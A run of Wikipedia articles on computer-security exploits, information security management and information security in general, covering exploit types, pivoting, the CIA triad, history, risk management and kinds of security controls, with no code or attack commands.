Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
An exploit (from the English verb to exploit, meaning "to use something to one’s own advantage") is a piece of software, a chunk of data, or a sequence of commands that takes advantage of a bug or vulnerability to cause unintended or unanticipated behavior to occur on computer software, hardware, or something electronic (usually computerized).[1] Such behavior frequently includes things like gaining control of a computer system, allowing privilege escalation, or a denial-of-service (DoS or related DDoS) attack. In lay terms, some exploit is akin to a 'hack'.


Classification[edit]
There are several methods of classifying exploits. The most common is by how the exploit communicates to the vulnerable software.
A remote exploit works over a network and exploits the security vulnerability without any prior access to the vulnerable system.
A local exploit requires prior access to the vulnerable system and usually increases the privileges of the person running the exploit past those granted by the system administrator. Exploits against client applications also exist, usually consisting of modified servers that send an exploit if accessed with a client application. A common form of exploits against client applications are browser exploits.
Exploits against client applications may also require some interaction with the user and thus may be used in combination with the social engineering method. Another classification is by the action against the vulnerable system; unauthorized data access, arbitrary code execution, and denial of service are examples.
Many exploits are designed to provide superuser-level access to a computer system. However, it is also possible to use several exploits, first to gain low-level access, then to escalate privileges repeatedly until one reaches the highest administrative level (often called "root").
After an exploit is made known to the authors of the affected software, the vulnerability is often fixed through a patch and the exploit becomes unusable. That is the reason why some black hat hackers as well as military or intelligence agencies' hackers do not publish their exploits but keep them private.
Exploits unknown to everyone except the people that found and developed them are referred to as zero day exploits.

Types[edit]
Exploitations are commonly categorized and named[2][3] by the type of vulnerability they exploit (see vulnerabilities for a list), whether they are local/remote and the result of running the exploit (e.g. EoP, DoS, spoofing). One scheme that offers zero day exploits is Exploit-as-a-service.[4]

Zero-click[edit]
A zero-click attack is an exploit that requires no user interaction to operate – that is to say, no key-presses or mouse clicks.[5] FORCEDENTRY, discovered in 2021, is an example of a zero-click attack.[6][7]
In 2022, NSO Group was reportedly selling zero-click exploits to governments for breaking into individuals' phones.[8]

Pivoting[edit]
Pivoting is a method used by hackers and penetration testers to expand the attack surface of a target organization. A compromised system to attack other systems on the same network that are not directly reachable from the Internet due to restrictions such as firewall. There tends to be more machines reachable from inside a network as compared to Internet facing hosts. For example, if an attacker compromises a web server on a corporate network, the attacker can then use the compromised web server to attack any reachable system on the network. These types of attacks are often called multi-layered attacks. Pivoting is also known as island hopping. 
Pivoting can further be distinguished into proxy pivoting and VPN pivoting:

Proxy pivoting is the practice of channeling traffic through a compromised target using a proxy payload on the machine and launching attacks from the computer.[9] This type of pivoting is restricted to certain TCP and UDP ports that are supported by the proxy.
VPN pivoting enables the attacker to create an encrypted layer to tunnel into the compromised machine to route any network traffic through that target machine, for example, to run a vulnerability scan on the internal network through the compromised machine, effectively giving the attacker full network access as if they were behind the firewall.
Typically, the proxy or VPN applications enabling pivoting are executed on the target computer as the payload of an exploit.
Pivoting is usually done by infiltrating a part of a network infrastructure (as an example, a vulnerable printer or thermostat) and using a scanner to find other devices connected to attack them. By attacking a vulnerable piece of networking, an attacker could infect most or all of a network and gain complete control.

See also[edit]
Computer security
Computer virus
Crimeware
Exploit kit
Hacking: The Art of Exploitation (second edition)
IT risk
Metasploit
Shellcode
w3af
Notes[edit]


^ "exploit - Definition". www.trendmicro.com. Retrieved 2021-09-04.

^ "Exploits Database by Offensive Security". www.exploit-db.com.

^ "Exploit Database | Rapid7". www.rapid7.com.

^ https://web.archive.org/web/20211123034031/https://portswigger.net/daily-swig/exploit-as-a-service-cybercriminals-exploring-potential-of-leasing-out-zero-day-vulnerabilities Exploit-as-a-service

^ "Sneaky Zero-Click Attacks Are a Hidden Menace". Wired. ISSN 1059-1028. Retrieved 2021-09-14.

^ "The Stealthy iPhone Hacks That Apple Still Can't Stop". Wired. ISSN 1059-1028. Retrieved 2021-09-14.

^ "A new NSO zero-click attack evades Apple's iPhone security protections, says Citizen Lab". TechCrunch. 24 August 2021. Retrieved 2021-09-14.

^ Ryan Gallagher (February 18, 2022). "Beware of 'Zero-Click' Hacks That Exploit Security Flaws in Phones' Operating Systems". Insurance Journal.

^ "Metasploit Basics – Part 3: Pivoting and Interfaces". Digital Bond.


External links[edit]
 Media related to Computer security exploits at Wikimedia Commons




Retrieved from "https://en.wikipedia.org/w/index.php?title=Exploit_(computer_security)&oldid=1127450156"
Categories: Computer security exploitsHidden categories: Articles with short descriptionShort description is different from WikidataCommons category link is on Wikidata
 



From Wikipedia, the free encyclopedia


Information security management (ISM) defines and manages controls that an organization needs to implement to ensure that it is sensibly protecting the confidentiality, availability, and integrity of assets from threats and vulnerabilities. The core of ISM includes information risk management, a process that involves the assessment of the risks an organization must deal with in the management and protection of assets, as well as the dissemination of the risks to all appropriate stakeholders.[1] This requires proper asset identification and valuation steps, including evaluating the value of confidentiality, integrity, availability, and replacement of assets.[2] As part of information security management, an organization may implement an information security management system and other best practices found in the ISO/IEC 27001, ISO/IEC 27002, and ISO/IEC 27035 standards on information security.[3][4]


Risk management and mitigation[edit]
Managing information security in essence means managing and mitigating the various threats and vulnerabilities to assets, while at the same time balancing the management effort expended on potential threats and vulnerabilities by gauging the probability of them actually occurring.[1][5][6] A meteorite crashing into a server room is certainly a threat, for example, but an information security officer will likely put little effort into preparing for such a threat.
After appropriate asset identification and valuation have occurred,[2] risk management and mitigation of risks to those assets involves the analysis of the following issues:[5][6][7]

Threats: Unwanted events that could cause the deliberate or accidental loss, damage, or misuse of information assets
Vulnerabilities: How susceptible information assets and associated controls are to exploitation by one or more threats
Impact and likelihood: The magnitude of potential damage to information assets from threats and vulnerabilities and how serious of a risk they pose to the assets; cost–benefit analysis may also be part of the impact assessment or separate from it
Mitigation: The proposed method(s) for minimizing the impact and likelihood of potential threats and vulnerabilities
Once a threat and/or vulnerability has been identified and assessed as having sufficient impact/likelihood on information assets, a mitigation plan can be enacted. The mitigation method is chosen largely depends on which of the seven information technology (IT) domains the threat and/or vulnerability resides in. The threat of user apathy toward security policies (the user domain) will require a much different mitigation plan than the one used to limit the threat of unauthorized probing and scanning of a network (the LAN-to-WAN domain).[7]

Information security management system[edit]
An information security management system (ISMS) represents the collation of all the interrelated/interacting information security elements of an organization so as to ensure policies, procedures, and objectives can be created, implemented, communicated, and evaluated to better guarantee the organization's overall information security. This system is typically influenced by an organization's needs, objectives, security requirements, size, and processes.[8] An ISMS includes and lends to risk management and mitigation strategies. Additionally, an organization's adoption of an ISMS indicates that it is systematically identifying, assessing, and managing information security risks and "will be capable of successfully addressing information confidentiality, integrity, and availability requirements."[9] However, the human factors associated with ISMS development, implementation, and practice (the user domain[7]) must also be considered to best ensure the ISMS' ultimate success.[10]

Implementation and education strategy components[edit]
Implementing an effective information security management (including risk management and mitigation) requires a management strategy that takes note of the following:[11]

Upper-level management must strongly support information security initiatives, allowing information security officers the opportunity "to obtain the resources necessary to have a fully functional and effective education program" and, by extension, information security management system.
Information security strategy and training must be integrated into and communicated through departmental strategies to ensure all personnel is positively affected by the organization's information security plan.
A privacy training and awareness "risk assessment" can help an organization identify critical gaps in stakeholder knowledge and attitude towards security.
Proper evaluation methods for "measuring the overall effectiveness of the training and awareness program" ensure policies, procedures, and training materials remain relevant.
Policies and procedures that are appropriately developed, implemented, communicated, and enforced "mitigate risk and ensure not only risk reduction, but also ongoing compliance with applicable laws, regulations, standards, and policies."
Milestones and timelines for all aspects of information security management help ensure future success.
Without sufficient budgetary considerations for all the above—in addition to the money allotted to standard regulatory, IT, privacy, and security issues—an information security management plan/system can not fully succeed.

Relevant standards[edit]
Standards that are available to assist organizations with implementing the appropriate programs and controls to mitigate threats and vulnerabilities include the ISO/IEC 27000 family of standards, the ITIL framework, the COBIT framework, and O-ISM3 2.0. The ISO/IEC 27000 family represents some of the most well-known standards governing information security management and the ISMS and are based on global expert opinion. They lay out the requirements for best "establishing, implementing, deploying, monitoring, reviewing, maintaining, updating, and improving information security management systems."[3][4] ITIL acts as a collection of concepts, policies, and best practices for the effective management of information technology infrastructure, service, and security, differing from ISO/IEC 27001 in only a few ways.[12][13] COBIT, developed by ISACA, is a framework for helping information security personnel develop and implement strategies for information management and governance while minimizing negative impacts and controlling information security and risk management,[4][12][14] and O-ISM3 2.0 is The Open Group's technology-neutral information security model for enterprise.[15]

See also[edit]
Certified Information Systems Security Professional
Chief information security officer
Security information management
References[edit]


^ a b Campbell, T. (2016). "Chapter 1: Evolution of a Profession". Practical Information Security Management: A Complete Guide to Planning and Implementation. APress. pp. 1–14. ISBN 9781484216859.

^ a b Tipton, H.F.; Krause, M. (2003). Information Security Management Handbook (5th ed.). CRC Press. pp. 810–11. ISBN 9780203325438.

^ a b Humphreys, E. (2016). "Chapter 2: ISO/IEC 27001 ISMS Family". Implementing the ISO/IEC 27001:2013 ISMS Standard. Artech House. pp. 11–26. ISBN 9781608079315.

^ a b c Campbell, T. (2016). "Chapter 6: Standards, Frameworks, Guidelines, and Legislation". Practical Information Security Management: A Complete Guide to Planning and Implementation. APress. pp. 71–94. ISBN 9781484216859.

^ a b Watts, S. (21 June 2017). "IT Security Vulnerability vs Threat vs Risk: What's the Difference?". BMC Blogs. BMC Software, Inc. Retrieved 16 June 2018.

^ a b Campbell, T. (2016). "Chapter 4: Organizational Security". Practical Information Security Management: A Complete Guide to Planning and Implementation. APress. pp. 43–61. ISBN 9781484216859.

^ a b c Kim, D.; Solomon, M.G. (2016). "Chapter 1: Information Systems Security". Fundamentals of Information Systems Security. Jones & Bartlett Learning. pp. 2–46. ISBN 9781284128239.

^ Terroza, A.K.S. (12 May 2015). "Information Security Management System (ISMS) Overview" (PDF). The Institute of Internal Auditors. Archived from the original (PDF) on 7 August 2016. Retrieved 16 June 2018.

^ "Need: The Need for ISMS". Threat and Risk Management. European Union Agency for Network and Information Security. Retrieved 16 June 2018.

^ Alavi, R.; Islam, S.; Mouratidis, H. (2014). "A Conceptual Framework to Analyze Human Factors of Information Security Management System (ISMS) in Organizations". Proceedings of the Second International Conference on Human Aspects of Information Security, Privacy, and Trust. 8533: 297–305. doi:10.1007/978-3-319-07620-1_26.

^ Tipton, H.F.; Krause, M. (2010). Information Security Management Handbook. Vol. 3 (6th ed.). CRC Press. pp. 100–02. ISBN 9781420090956.

^ a b Kim, D.; Solomon, M.G. (2016). Fundamentals of Information Systems Security. Jones & Bartlett Learning. p. 225. ISBN 9781284128239.

^ Leal, R. (7 March 2016). "ISO 27001 vs. ITIL: Similarities and differences". The ISO 27001 & ISO 22301 Blog. Advisera Expert Solutions Ltd. Retrieved 16 June 2018.

^ White, S.K. (22 December 2017). "What is COBIT? A framework for alignment and governance". CIO. IDG Communications, Inc. Retrieved 16 June 2018.

^ "Open Information Security Management Maturity Model (O-ISM3), Version 2.0". The Open Group. 21 September 2017. Retrieved 16 June 2018.


External links[edit]
ISACA
The Open Group
Authority control: National libraries 
Japan





Retrieved from "https://en.wikipedia.org/w/index.php?title=Information_security_management&oldid=1136189989"
Categories: Information managementInformation technology managementSecurityHidden categories: Articles with NDL identifiers
 



From Wikipedia, the free encyclopedia


Protecting information by mitigating risk
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Information security, sometimes shortened to InfoSec,[1] is the practice of protecting information by mitigating information risks. It is part of information risk management.[2][3] It typically involves preventing or reducing the probability of unauthorized/inappropriate access to data, or the unlawful use, disclosure, disruption, deletion, corruption, modification, inspection, recording, or devaluation of information.[4] It also involves actions intended to reduce the adverse impacts of such incidents. Protected information may take any form, e.g. electronic or physical, tangible (e.g. paperwork) or intangible (e.g. knowledge).[5][6] Information security's primary focus is the balanced protection of the confidentiality, integrity, and availability of data (also known as the CIA triad) while maintaining a focus on efficient policy implementation, all without hampering organization productivity.[7] This is largely achieved through a structured risk management process that involves: 

identifying information and related assets, plus potential threats, vulnerabilities, and impacts;
evaluating the risks
deciding how to address or treat the risks i.e. to avoid, mitigate, share or accept them
where risk mitigation is required, selecting or designing appropriate security controls and implementing them
monitoring the activities, making adjustments as necessary to address any issues, changes and improvement opportunities[8]
To standardize this discipline, academics and professionals collaborate to offer guidance, policies, and industry standards on password, antivirus software, firewall, encryption software, legal liability, security awareness and training, and so forth.[9] This standardization may be further driven by a wide variety of laws and regulations that affect how data is accessed, processed, stored, transferred and destroyed.[10] However, the implementation of any standards and guidance within an entity may have limited effect if a culture of continual improvement isn't adopted.[11]


Definition[edit]
 Information Security Attributes: or qualities, i.e., Confidentiality, Integrity and Availability (CIA). Information Systems are composed in three main portions, hardware, software and communications with the purpose to help identify and apply information security industry standards, as mechanisms of protection and prevention, at three levels or layers: physical, personal and organizational. Essentially, procedures or policies are implemented to tell administrators, users and operators how to use products to ensure information security within the organizations.[12]
Various definitions of information security are suggested below, summarized from different sources:

"Preservation of confidentiality, integrity and availability of information. Note: In addition, other properties, such as authenticity, accountability, non-repudiation and reliability can also be involved." (ISO/IEC 27000:2009)[13]
"The protection of information and information systems from unauthorized access, use, disclosure, disruption, modification, or destruction in order to provide confidentiality, integrity, and availability." (CNSS, 2010)[14]
"Ensures that only authorized users (confidentiality) have access to accurate and complete information (integrity) when required (availability)." (ISACA, 2008)[15]
"Information Security is the process of protecting the intellectual property of an organisation."  (Pipkin, 2000)[16]
"...information security is a risk management discipline, whose job is to manage the cost of information risk to the business." (McDermott and Geer, 2001)[17]
"A well-informed sense of assurance that information risks and controls are in balance." (Anderson, J., 2003)[18]
"Information security is the protection of information and minimizes the risk of exposing information to unauthorized parties." (Venter and Eloff, 2003)[19]
"Information Security is a multidisciplinary area of study and professional activity which is concerned with the development and implementation of security mechanisms of all available types (technical, organizational, human-oriented and legal) in order to keep information in all its locations (within and outside the organization's perimeter) and, consequently, information systems, where information is created, processed, stored, transmitted and destroyed, free from threats.[20] Threats to information and information systems may be categorized and a corresponding security goal may be defined for each category of threats.[21] A set of security goals, identified as a result of a threat analysis, should be revised periodically to ensure its adequacy and conformance with the evolving environment.[22] The currently relevant set of security goals may include: confidentiality, integrity, availability, privacy, authenticity & trustworthiness, non-repudiation, accountability and auditability." (Cherdantseva and Hilton, 2013)[12]
Information and information resource security using telecommunication system or devices means protecting information, information systems or books from unauthorized access, damage, theft, or destruction (Kurose and Ross, 2010).[23]
Overview[edit]
At the core of information security is information assurance, the act of maintaining the confidentiality, integrity, and availability (CIA) of information, ensuring that information is not compromised in any way when critical issues arise.[24] These issues include but are not limited to natural disasters, computer/server malfunction, and physical theft. While paper-based business operations are still prevalent, requiring their own set of information security practices, enterprise digital initiatives are increasingly being emphasized,[25][26] with information assurance now typically being dealt with by information technology (IT) security specialists. These specialists apply information security to technology (most often some form of computer system). It is worthwhile to note that a computer does not necessarily mean a home desktop.[27] A computer is any device with a processor and some memory. Such devices can range from non-networked standalone devices as simple as calculators, to networked mobile computing devices such as smartphones and tablet computers.[28] IT security specialists are almost always found in any major enterprise/establishment due to the nature and value of the data within larger businesses.[29] They are responsible for keeping all of the technology within the company secure from malicious cyber attacks that often attempt to acquire critical private information or gain control of the internal systems.[30][31]
The field of information security has grown and evolved significantly in recent years.[32] It offers many areas for specialization, including securing networks and allied infrastructure, securing applications and databases, security testing, information systems auditing, business continuity planning, electronic record discovery, and digital forensics.[citation needed] Information security professionals are very stable in their employment.[33] As of 2013[update] more than 80 percent of professionals had no change in employer or employment over a period of a year, and the number of professionals is projected to continuously grow more than 11 percent annually from 2014 to 2019.[34]

Threats[edit]
Information security threats come in many different forms.[35][36] Some of the most common threats today are software attacks, theft of intellectual property, theft of identity, theft of equipment or information, sabotage, and information extortion.[37][38] Viruses,[39] worms, phishing attacks, and Trojan horses are a few common examples of software attacks. The theft of intellectual property has also been an extensive issue for many businesses in the information technology (IT) field.[40] Identity theft is the attempt to act as someone else usually to obtain that person's personal information or to take advantage of their access to vital information through social engineering.[41][42] Theft of equipment or information is becoming more prevalent today due to the fact that most devices today are mobile,[43] are prone to theft and have also become far more desirable as the amount of data capacity increases. Sabotage usually consists of the destruction of an organization's website in an attempt to cause loss of confidence on the part of its customers.[44] Information extortion consists of theft of a company's property or information as an attempt to receive a payment in exchange for returning the information or property back to its owner, as with ransomware.[45] There are many ways to help protect yourself from some of these attacks but one of the most functional precautions is conduct periodical user awareness.[46] The number one threat to any organisation are users or internal employees, they are also called insider threats.[47]
Governments, military, corporations, financial institutions, hospitals, non-profit organisations, and private businesses amass a great deal of confidential information about their employees, customers, products, research, and financial status.[48] Should confidential information about a business's customers or finances or new product line fall into the hands of a competitor or a black hat hacker, a business and its customers could suffer widespread, irreparable financial loss, as well as damage to the company's reputation.[49] From a business perspective, information security must be balanced against cost; the Gordon-Loeb Model provides a mathematical economic approach for addressing this concern.[50]
For the individual, information security has a significant effect on privacy, which is viewed very differently in various cultures.[51]

Responses to threats[edit]
Possible responses to a security threat or risk are:[52]

reduce/mitigate – implement safeguards and countermeasures to eliminate vulnerabilities or block threats
assign/transfer – place the cost of the threat onto another entity or organization such as purchasing insurance or outsourcing
accept – evaluate if the cost of the countermeasure outweighs the possible cost of loss due to the threat[53]
History[edit]
Since the early days of communication, diplomats and military commanders understood that it was necessary to provide some mechanism to protect the confidentiality of correspondence and to have some means of detecting tampering.[54] Julius Caesar is credited with the invention of the Caesar cipher c. 50 B.C., which was created in order to prevent his secret messages from being read should a message fall into the wrong hands.[55] However, for the most part protection was achieved through the application of procedural handling controls.[56][57] Sensitive information was marked up to indicate that it should be protected and transported by trusted persons, guarded and stored in a secure environment or strong box.[58] As postal services expanded, governments created official organizations to intercept, decipher, read, and reseal letters (e.g., the U.K.'s Secret Office, founded in 1653[59]).
In the mid-nineteenth century more complex classification systems were developed to allow governments to manage their information according to the degree of sensitivity.[60] For example, the British Government codified this, to some extent, with the publication of the Official Secrets Act in 1889.[61] Section 1 of the law concerned espionage and unlawful disclosures of information, while Section 2 dealt with breaches of official trust.[62] A public interest defense was soon added to defend disclosures in the interest of the state.[63] A similar law was passed in India in 1889, The Indian Official Secrets Act, which was associated with the British colonial era and used to crack down on newspapers that opposed the Raj's policies.[64] A newer version was passed in 1923 that extended to all matters of confidential or secret information for governance.[65]  By the time of the First World War, multi-tier classification systems were used to communicate information to and from various fronts, which encouraged greater use of code making and breaking sections in diplomatic and military headquarters.[66] Encoding became more sophisticated between the wars as machines were employed to scramble and unscramble information.[67]
The establishment of computer security inaugurated the history of information security. The need for such appeared during World War II.[68] The volume of information shared by the Allied countries during the Second World War necessitated formal alignment of classification systems and procedural controls.[69] An arcane range of markings evolved to indicate who could handle documents (usually officers rather than enlisted troops) and where they should be stored as increasingly complex safes and storage facilities were developed.[70] The Enigma Machine, which was employed by the Germans to encrypt the data of warfare and was successfully decrypted by Alan Turing, can be regarded as a striking example of creating and using secured information.[71] Procedures evolved to ensure documents were destroyed properly, and it was the failure to follow these procedures which led to some of the greatest intelligence coups of the war (e.g., the capture of U-570[71]).
Various Mainframe computers were connected online during the Cold War to complete more sophisticated tasks, in a communication process easier than mailing magnetic tapes back and forth by computer centers. As such, the Advanced Research Projects Agency (ARPA), of the United States Department of Defense, started researching the feasibility of a networked system of communication to trade information within the United States Armed Forces. In 1968, the ARPANET project was formulated by Dr. Larry Roberts, which would later evolve into what is known as the internet.[72]
In 1973, important elements of ARPANET security were found by internet pioneer Robert Metcalfe to have many flaws such as the: "vulnerability of password structure and formats; lack of safety procedures for dial-up connections; and nonexistent user identification and authorizations", aside from the lack of controls and safeguards to keep data safe from unauthorized access. Hackers had effortless access to ARPANET, as phone numbers were known by the public.[73] Due to these problems, coupled with the constant violation of computer security, as well as the exponential increase in the number of hosts and users of the system, "network security" was often alluded to as "network insecurity".[73]
The end of the twentieth century and the early years of the twenty-first century saw rapid advancements in telecommunications, computing hardware and software, and data encryption.[74] The availability of smaller, more powerful, and less expensive computing equipment made electronic data processing within the reach of small business and home users.[75] The establishment of Transfer Control Protocol/Internetwork Protocol (TCP/IP) in the early 1980s enabled different types of computers to communicate.[76] These computers quickly became interconnected through the internet.[77]
The rapid growth and widespread use of electronic data processing and electronic business conducted through the internet, along with numerous occurrences of international terrorism, fueled the need for better methods of protecting the computers and the information they store, process, and transmit.[78] The academic disciplines of computer security and information assurance emerged along with numerous professional organizations, all sharing the common goals of ensuring the security and reliability of information systems.[citation needed]

Basic principles[edit]
Key concepts[edit]
 Poster promoting information security by the Russian Ministry of Defence
The CIA triad of confidentiality, integrity, and availability is at the heart of information security.[79] (The members of the classic InfoSec triad—confidentiality, integrity, and availability—are interchangeably referred to in the literature as security attributes, properties, security goals, fundamental aspects, information criteria, critical information characteristics and basic building blocks.)[80] However, debate continues about whether or not this CIA triad is sufficient to address rapidly changing technology and business requirements, with recommendations to consider expanding on the intersections between availability and confidentiality, as well as the relationship between security and privacy.[24] Other principles such as "accountability" have sometimes been proposed; it has been pointed out that issues such as non-repudiation do not fit well within the three core concepts.[81]
The triad seems to have first been mentioned in a NIST publication in 1977.[82]
In 1992 and revised in 2002, the OECD's Guidelines for the Security of Information Systems and Networks[83] proposed the nine generally accepted principles: awareness, responsibility, response, ethics, democracy, risk assessment, security design and implementation, security management, and reassessment.[84] Building upon those, in 2004 the NIST's Engineering Principles for Information Technology Security[81] proposed 33 principles. From each of these derived guidelines and practices.
In 1998, Donn Parker proposed an alternative model for the classic CIA triad that he called the six atomic elements of information. The elements are confidentiality, possession, integrity, authenticity, availability, and utility. The merits of the Parkerian Hexad are a subject of debate amongst security professionals.[85]
In 2011, The Open Group published the information security management standard O-ISM3.[86] This standard proposed an operational definition of the key concepts of security, with elements called "security objectives", related to access control (9), availability (3), data quality (1), compliance, and technical (4). In 2009, DoD Software Protection Initiative Archived 2016-09-25 at the Wayback Machine released the Three Tenets of Cybersecurity Archived 2020-05-10 at the Wayback Machine which are System Susceptibility, Access to the Flaw, and Capability to Exploit the Flaw.[87][88][89] Neither of these models are widely adopted.

Confidentiality[edit]
In information security, confidentiality "is the property, that information is not made available or disclosed to unauthorized individuals, entities, or processes."[90] While similar to "privacy," the two words are not interchangeable. Rather, confidentiality is a component of privacy that implements to protect our data from unauthorized viewers.[91] Examples of confidentiality of electronic data being compromised include laptop theft, password theft, or sensitive emails being sent to the incorrect individuals.[92]

Integrity[edit]
In IT security, data integrity means maintaining and assuring the accuracy and completeness of data over its entire lifecycle.[93] This means that data cannot be modified in an unauthorized or undetected manner.[94] This is not the same thing as referential integrity in databases, although it can be viewed as a special case of consistency as understood in the classic ACID model of transaction processing.[95] Information security systems typically incorporate controls to ensure their own integrity, in particular protecting the kernel or core functions against both deliberate and accidental threats.[96] Multi-purpose and multi-user computer systems aim to compartmentalize the data and processing such that no user or process can adversely impact another: the controls may not succeed however, as we see in incidents such as malware infections, hacks, data theft, fraud, and privacy breaches.[97]
More broadly, integrity is an information security principle that involves human/social, process, and commercial integrity, as well as data integrity. As such it touches on aspects such as credibility, consistency, truthfulness, completeness, accuracy, timeliness, and assurance.[98]

Availability[edit]
For any information system to serve its purpose, the information must be available when it is needed.[99] This means the computing systems used to store and process the information, the security controls used to protect it, and the communication channels used to access it must be functioning correctly.[100] High availability systems aim to remain available at all times, preventing service disruptions due to power outages, hardware failures, and system upgrades.[101] Ensuring availability also involves preventing denial-of-service attacks, such as a flood of incoming messages to the target system, essentially forcing it to shut down.[102]
In the realm of information security, availability can often be viewed as one of the most important parts of a successful information security program.[citation needed] Ultimately end-users need to be able to perform job functions; by ensuring availability an organization is able to perform to the standards that an organization's stakeholders expect.[103] This can involve topics such as proxy configurations, outside web access, the ability to access shared drives and the ability to send emails.[104] Executives oftentimes do not understand the technical side of information security and look at availability as an easy fix, but this often requires collaboration from many different organizational teams, such as network operations, development operations, incident response, and policy/change management.[105] A successful information security team involves many different key roles to mesh and align for the CIA triad to be provided effectively.[106]

Non-repudiation[edit]
In law, non-repudiation implies one's intention to fulfill their obligations to a contract. It also implies that one party of a transaction cannot deny having received a transaction, nor can the other party deny having sent a transaction.[107]
It is important to note that while technology such as cryptographic systems can assist in non-repudiation efforts, the concept is at its core a legal concept transcending the realm of technology.[108] It is not, for instance, sufficient to show that the message matches a digital signature signed with the sender's private key, and thus only the sender could have sent the message, and nobody else could have altered it in transit (data integrity).[109] The alleged sender could in return demonstrate that the digital signature algorithm is vulnerable or flawed, or allege or prove that his signing key has been compromised.[110] The fault for these violations may or may not lie with the sender, and such assertions may or may not relieve the sender of liability, but the assertion would invalidate the claim that the signature necessarily proves authenticity and integrity. As such, the sender may repudiate the message (because authenticity and integrity are pre-requisites for non-repudiation).[111]

Risk management[edit]
Main article: Risk management
Broadly speaking, risk is the likelihood that something bad will happen that causes harm to an informational asset (or the loss of the asset).[112] A vulnerability is a weakness that could be used to endanger or cause harm to an informational asset. A threat is anything (man-made or act of nature) that has the potential to cause harm.[113] The likelihood that a threat will use a vulnerability to cause harm creates a risk. When a threat does use a vulnerability to inflict harm, it has an impact.[114] In the context of information security, the impact is a loss of availability, integrity, and confidentiality, and possibly other losses (lost income, loss of life, loss of real property).[115]
The Certified Information Systems Auditor (CISA) Review Manual 2006 defines risk management as "the process of identifying vulnerabilities and threats to the information resources used by an organization in achieving business objectives, and deciding what countermeasures,[116] if any, to take in reducing risk to an acceptable level, based on the value of the information resource to the organization."[117]
There are two things in this definition that may need some clarification. First, the process of risk management is an ongoing, iterative process. It must be repeated indefinitely. The business environment is constantly changing and new threats and vulnerabilities emerge every day.[118] Second, the choice of countermeasures (controls) used to manage risks must strike a balance between productivity, cost, effectiveness of the countermeasure, and the value of the informational asset being protected.[119] Furthermore, these processes have limitations as security breaches are generally rare and emerge in a specific context which may not be easily duplicated.[120] Thus, any process and countermeasure should itself be evaluated for vulnerabilities.[121] It is not possible to identify all risks, nor is it possible to eliminate all risk. The remaining risk is called "residual risk.[122]"
A risk assessment is carried out by a team of people who have knowledge of specific areas of the business.[123] Membership of the team may vary over time as different parts of the business are assessed.[124] The assessment may use a subjective qualitative analysis based on informed opinion, or where reliable dollar figures and historical information is available, the analysis may use quantitative analysis.
Research has shown that the most vulnerable point in most information systems is the human user, operator, designer, or other human.[125] The ISO/IEC 27002:2005 Code of practice for information security management recommends the following be examined during a risk assessment:

security policy,
organization of information security,
asset management,
human resources security,
physical and environmental security,
communications and operations management,
access control,
information systems acquisition, development, and maintenance,
information security incident management,
business continuity management
regulatory compliance.
In broad terms, the risk management process consists of:[126][127]

Identification of assets and estimating their value. Include: people, buildings, hardware, software, data (electronic, print, other), supplies.[128]
Conduct a threat assessment. Include: Acts of nature, acts of war, accidents, malicious acts originating from inside or outside the organization.[129]
Conduct a vulnerability assessment, and for each vulnerability, calculate the probability that it will be exploited. Evaluate policies, procedures, standards, training, physical security, quality control, technical security.[130]
Calculate the impact that each threat would have on each asset. Use qualitative analysis or quantitative analysis.[131]
Identify, select and implement appropriate controls. Provide a proportional response. Consider productivity, cost effectiveness, and value of the asset.[132]
Evaluate the effectiveness of the control measures. Ensure the controls provide the required cost effective protection without discernible loss of productivity.[133]
For any given risk, management can choose to accept the risk based upon the relative low value of the asset, the relative low frequency of occurrence, and the relative low impact on the business.[134] Or, leadership may choose to mitigate the risk by selecting and implementing appropriate control measures to reduce the risk. In some cases, the risk can be transferred to another business by buying insurance or outsourcing to another business.[135] The reality of some risks may be disputed. In such cases leadership may choose to deny the risk.[136]

Security controls[edit]
Main article: security controls
Selecting and implementing proper security controls will initially help an organization bring down risk to acceptable levels.[137] Control selection should follow and should be based on the risk assessment.[138] Controls can vary in nature, but fundamentally they are ways of protecting the confidentiality, integrity or availability of information. ISO/IEC 27001 has defined controls in different areas.[139] Organizations can implement additional controls according to requirement of the organization.[140] ISO/IEC 27002 offers a guideline for organizational information security standards.[141]

Administrative[edit]
Administrative controls (also called procedural controls) consist of approved written policies, procedures, standards, and guidelines. Administrative controls form the framework for running the business and managing people.[142] They inform people on how the business is to be run and how day-to-day operations are to be conducted. Laws and regulations created by government bodies are also a type of administrative control because they inform the business.[143] Some industry sectors have policies, procedures, standards, and guidelines that must be followed – the Payment Card Industry Data Security Standard[144] (PCI DSS) required by Visa and MasterCard is such an example. Other examples of administrative controls include the corporate security policy, password policy, hiring policies, and disciplinary policies.[145]
Administrative controls form the basis for the selection and implementation of logical and physical controls. Logical and physical controls are manifestations of administrative controls, which are of paramount importance.[142]

Logical[edit]
Logical controls (also called technical controls) use software and data to monitor and control access to information and computing systems.[citation needed] Passwords, network and host-based firewalls, network intrusion detection systems, access control lists, and data encryption are examples of logical controls.[146]
